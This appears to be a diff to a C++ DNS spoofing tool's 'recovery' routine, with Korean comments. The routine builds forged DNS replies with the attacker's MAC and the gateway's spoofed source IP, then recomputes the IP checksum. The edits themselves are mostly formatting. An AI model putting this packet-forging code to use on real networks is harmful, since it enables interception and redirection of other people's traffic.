@@ -284,11 +284,13 @@ void DnsSpoofer::send_recovery_responses(pcap_t* handle,
                                           const vector<unique_ptr<SpoofTarget>>& targets)
 {
     cout << "DNS 스푸핑 복구 시작 (NXDOMAIN 패킷 + 정상 IP 패킷)..." << endl;
-    const vector<string> recovery_domains = {"www.naver.com", "www.google.com", "www.daum.net"};
+
     
     for (const auto& domain : recovery_domains) {
         string normalized_domain = domain;
-        for (auto &c : normalized_domain) c = tolower(c);
+        for (auto &c : normalized_domain) {
+            c = tolower(c);
+        }
         
         if (template_cache.find(normalized_domain) == template_cache.end()) {
             cerr << "[" << domain << "] DNS 템플릿 없음. 복구 생략.\n";
@@ -301,10 +303,13 @@ void DnsSpoofer::send_recovery_responses(pcap_t* handle,
                 for (const auto& target : targets) {
                     vector<uint8_t> nxdomain_packet = cache_entry.packet;
                     const int eth_len = 14;
+
+                    // 이더넷 헤더 수정
                     struct ether_header* eth_nx = reinterpret_cast<struct ether_header*>(nxdomain_packet.data());
                     memcpy(eth_nx->ether_shost, attacker_mac, 6);
                     memcpy(eth_nx->ether_dhost, target->get_mac(), 6);
-                    
+
+                    // IP 헤더 수정
                     struct ip* ip_nx = reinterpret_cast<struct ip*>(nxdomain_packet.data() + eth_len);
                     int ip_header_len = ip_nx->ip_hl * 4;
                     memcpy(&ip_nx->ip_src, gateway_ip, 4);
@@ -313,8 +318,9 @@ void DnsSpoofer::send_recovery_responses(pcap_t* handle,
                     ip_nx->ip_sum = 0;
                     uint16_t* ip_words = reinterpret_cast<uint16_t*>(ip_nx);
                     unsigned long ip_sum = 0;
-                    for (int i = 0; i < ip_header_len/2; i++)
+                    for (int i = 0; i < ip_header_len/2; i++) {
                         ip_sum += ntohs(ip_words[i]);
+                    }
                     while (ip_sum >> 16)
                         ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
                     ip_nx->ip_sum = htons(~ip_sum);
